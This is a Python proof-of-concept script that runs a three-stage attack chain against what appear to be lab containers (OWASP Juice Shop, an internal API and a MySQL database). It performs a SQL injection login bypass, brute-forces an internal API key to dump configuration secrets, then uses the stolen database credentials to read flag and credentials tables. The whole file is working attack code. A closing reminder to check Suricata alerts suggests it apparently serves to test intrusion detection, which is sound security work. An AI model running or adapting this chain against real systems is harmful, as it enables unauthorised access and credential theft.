#!/usr/bin/env python3
"""Infiltration - Multi-stage attack: SQLi -> credential theft -> DB access -> flag capture."""

import requests
import json
import sys
import time

TARGET = "http://juice-shop:3000"
INTERNAL_API = "http://internal-api:5000"
DB_HOST = "internal-db"
DB_PORT = 3306


def stage1_sqli():
    """Stage 1: SQL injection to gain initial access."""
    print("=" * 60)
    print("[*] STAGE 1: SQL Injection - Gain Initial Access")
    print("=" * 60)

    url = f"{TARGET}/rest/user/login"
    payload = {"email": "' OR 1=1--", "password": "anything"}

    print(f"[*] Attempting SQLi login bypass on Juice Shop...")
    resp = requests.post(url, json=payload, timeout=10)

    if resp.status_code == 200:
        data = resp.json()
        token = data.get("authentication", {}).get("token")
        email = data.get("authentication", {}).get("umail", "unknown")
        print(f"[+] Access granted! Logged in as: {email}")
        print(f"[+] Token: {token[:40]}...")
        return token
    else:
        print(f"[-] SQLi returned status {resp.status_code}")
        print("[*] Continuing with infiltration attempt...")
        return None


def stage2_api_probe():
    """Stage 2: Probe internal API for sensitive information."""
    print()
    print("=" * 60)
    print("[*] STAGE 2: Internal API Probing")
    print("=" * 60)

    # Try common API keys / headers
    print(f"[*] Probing internal API at {INTERNAL_API}...")

    # Check health first
    try:
        resp = requests.get(f"{INTERNAL_API}/health", timeout=5)
        print(f"[+] API is alive: {resp.json()}")
    except Exception as e:
        print(f"[-] API health check failed: {e}")
        return None

    # Try to access admin endpoint without key
    print("[*] Attempting /admin/users without credentials...")
    resp = requests.get(f"{INTERNAL_API}/admin/users", timeout=5)
    print(f"  Response: {resp.status_code} - {resp.text[:100]}")

    # Try common API keys
    common_keys = [
        "admin", "secret", "internal", "s3cret-internal-key-2024",
        "api-key-123", "changeme",
    ]
    print()
    print("[*] Brute forcing API key via X-Internal-Key header...")

    for key in common_keys:
        headers = {"X-Internal-Key": key}
        resp = requests.get(f"{INTERNAL_API}/admin/users", headers=headers, timeout=5)
        if resp.status_code == 200:
            print(f"  Key: {key:40s} -> SUCCESS!")
            data = resp.json()
            print(f"[+] Found {len(data.get('users', []))} user records!")
            for user in data.get("users", []):
                print(f"    - {user.get('username'):15s} ({user.get('email'):25s}) role={user.get('role')}")

            # Also try /admin/config for DB credentials
            print()
            print("[*] Accessing /admin/config for infrastructure secrets...")
            resp2 = requests.get(f"{INTERNAL_API}/admin/config", headers=headers, timeout=5)
            if resp2.status_code == 200:
                config = resp2.json()
                print(f"[+] Config dump:")
                print(json.dumps(config, indent=2))
                return config
            return None
        else:
            print(f"  Key: {key:40s} -> {resp.status_code}")

    print("[-] Could not find valid API key")
    return None


def stage3_db_access(config):
    """Stage 3: Connect to internal DB using stolen credentials."""
    print()
    print("=" * 60)
    print("[*] STAGE 3: Internal Database Access")
    print("=" * 60)

    db_host = config.get("db_host", DB_HOST) if config else DB_HOST
    db_port = config.get("db_port", DB_PORT) if config else DB_PORT
    db_user = config.get("db_user", "root") if config else "root"
    db_pass = config.get("db_password", "rootpass") if config else "rootpass"
    db_name = config.get("db_name", "secrets") if config else "secrets"

    print(f"[*] Connecting to MySQL at {db_host}:{db_port} as {db_user}...")

    try:
        import mysql.connector

        conn = mysql.connector.connect(
            host=db_host,
            port=db_port,
            user=db_user,
            password=db_pass,
            database=db_name,
        )
        cursor = conn.cursor()

        print("[+] Connected to database!")
        print()

        # List tables
        cursor.execute("SHOW TABLES")
        tables = cursor.fetchall()
        print(f"[+] Tables in '{db_name}': {[t[0] for t in tables]}")
        print()

        # Read flag
        print("[*] Reading flag table...")
        cursor.execute("SELECT * FROM flag")
        rows = cursor.fetchall()
        for row in rows:
            print(f"[+] Row: id={row[0]}, value={row[1]}")

        # Read credentials
        print()
        print("[*] Reading credentials table...")
        cursor.execute("SELECT * FROM credentials")
        rows = cursor.fetchall()
        for row in rows:
            print(f"[+] Credential: id={row[0]}, service={row[1]}, user={row[2]}, pass={row[3]}")

        cursor.close()
        conn.close()

        return True

    except ImportError:
        print("[-] mysql-connector-python not installed")
        print("[*] Attempting raw socket connection to prove connectivity...")
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((db_host, db_port))
            banner = s.recv(1024)
            print(f"[+] MySQL banner: {banner[:100]}")
            s.close()
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    except Exception as e:
        print(f"[-] Database error: {e}")
        return False


def main():
    print("[*] Infiltration PoC - Multi-Stage Attack Chain")
    print(f"[*] Targets: Juice Shop -> Internal API -> Internal DB")
    print()

    start = time.time()

    # Stage 1: SQLi
    token = stage1_sqli()

    time.sleep(0.5)

    # Stage 2: API probing
    config = stage2_api_probe()

    time.sleep(0.5)

    # Stage 3: DB access
    success = stage3_db_access(config)

    elapsed = time.time() - start
    print()
    print("=" * 60)
    print("[*] INFILTRATION SUMMARY")
    print("=" * 60)
    print(f"[*] Stage 1 (SQLi):      {'SUCCESS' if token else 'PARTIAL'}")
    print(f"[*] Stage 2 (API Probe): {'SUCCESS' if config else 'FAILED'}")
    print(f"[*] Stage 3 (DB Access): {'SUCCESS' if success else 'FAILED'}")
    print(f"[*] Total time: {elapsed:.1f}s")

    if success:
        print()
        print("[+] INFILTRATION COMPLETE - FLAG{infiltration_success}")
    print()
    print("[*] Check Suricata alerts for SID 100001, 100011.")

if __name__ == "__main__":
    main()
